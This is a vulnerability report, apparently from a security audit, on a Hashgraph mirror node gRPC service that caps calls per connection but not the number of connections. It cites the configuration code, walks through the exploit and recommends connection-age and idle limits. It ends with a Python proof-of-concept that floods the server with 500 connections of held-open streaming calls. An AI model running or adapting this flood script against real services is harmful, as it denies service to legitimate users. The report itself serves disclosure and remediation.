### Title
Unbounded gRPC Connection Count Enables Resource Exhaustion DoS Against Hashgraph History Service

### Summary
`grpcServerConfigurer()` configures only `maxConcurrentCallsPerConnection` (default: 5) on the `NettyServerBuilder` but sets no limit on the total number of accepted connections, no `maxConnectionAge`, and no `maxConnectionIdle`. An unprivileged attacker can open an arbitrarily large number of TCP connections and saturate each with 5 concurrent streaming calls, exhausting the shared `applicationTaskExecutor` thread pool, the HikariCP database connection pool, and OS file descriptors, rendering the Hashgraph history gRPC service unavailable to all legitimate clients.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // No maxConnectionAge, no maxConnectionIdle, no connection count cap
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** The `NettyServerBuilder` customizer applies only a per-connection call cap. It never calls `maxConnectionAge()`, `maxConnectionIdle()`, or any equivalent Netty-level channel option to cap the total number of live connections. The failed assumption is that `maxConcurrentCallsPerConnection` alone bounds total server load — it does not; it only bounds load *per connection*, while the number of connections is unbounded.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (or via the nginx proxy on 8080, which imposes no per-client connection limit).
2. On each connection the attacker immediately issues 5 concurrent `subscribeTopic` streaming RPCs (the per-connection maximum), keeping them alive indefinitely by never sending a terminal frame.
3. Each active streaming call holds a thread from `applicationTaskExecutor` and, during historical retrieval, a HikariCP database connection.
4. With N large enough, the bounded thread pool queue fills and new tasks are rejected; the HikariCP pool is exhausted; OS file descriptors are consumed.
5. Legitimate `subscribeTopic` and `getTopicMessages` calls time out or are rejected with `RESOURCE_EXHAUSTED`.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` caps streams per connection but multiplies with an unbounded connection count — total active streams = N × 5, which is unbounded.
- The nginx `keepalive 16` directive governs only nginx→grpc upstream keep-alive slots, not inbound client connections.
- No authentication, IP rate-limiting, or connection-rate throttle is applied anywhere in the gRPC stack.
- Prometheus alerts for high file descriptors and high DB connections fire only after the damage is done (5-minute `for` window) and do not auto-mitigate.

### Impact Explanation
Complete denial of service for the gRPC Hashgraph history API (`subscribeTopic`, address book queries). All legitimate subscribers are starved of threads and database connections. Because the `subscribeTopic` stream is the primary mechanism for clients to read Hashgraph consensus history in real time, this constitutes tampering with the availability of that history. Severity: **High**.

### Likelihood Explanation
No privileges, credentials, or special knowledge are required — only network reachability to port 5600 or 8080. The attack is trivially scriptable with any gRPC client library (e.g., `grpc-java`, `grpcurl` in a loop, or a custom Python script using `grpcio`). It is repeatable and sustainable: the attacker simply holds connections open. A single commodity machine with a few thousand file descriptors can execute it.

### Recommendation
Add the following to `grpcServerConfigurer()` in `GrpcConfiguration.java`:

```java
serverBuilder.maxConnectionAge(30, TimeUnit.MINUTES);
serverBuilder.maxConnectionAgeGrace(5, TimeUnit.MINUTES);
serverBuilder.maxConnectionIdle(5, TimeUnit.MINUTES);
```

Additionally, expose a configurable `maxConnections` field in `NettyProperties` and apply it via the Netty `childOption` / `option` channel configuration (e.g., using `NettyServerBuilder`'s `withChildOption` to set `ChannelOption.SO_BACKLOG` and a custom `ChannelHandler` that counts active channels). At the infrastructure layer, enforce per-source-IP connection rate limits at the load balancer or nginx level.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# Target: grpc server on port 5600
TARGET = "target-host:5600"
CONNECTIONS = 500   # open 500 connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = ConsensusServiceStub(channel)  # com.hedera.mirror.api.proto.ConsensusService
    streams = []
    for _ in range(STREAMS_PER_CONN):
        req = ConsensusTopicQuery(topic_id=ConsensusTopicID(topic_num=1))
        # Open a long-lived streaming call; never consume responses
        stream = stub.subscribeTopic(req)
        streams.append(stream)
    # Hold all streams open indefinitely
    threading.Event().wait()

with ThreadPoolExecutor(max_workers=CONNECTIONS) as pool:
    list(pool.map(flood_connection, range(CONNECTIONS)))

# Result: 500 * 5 = 2500 concurrent streaming calls
# applicationTaskExecutor and HikariCP pool exhausted
# Legitimate clients receive RESOURCE_EXHAUSTED or connection timeout
``` [1](#0-0) [2](#0-1)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```
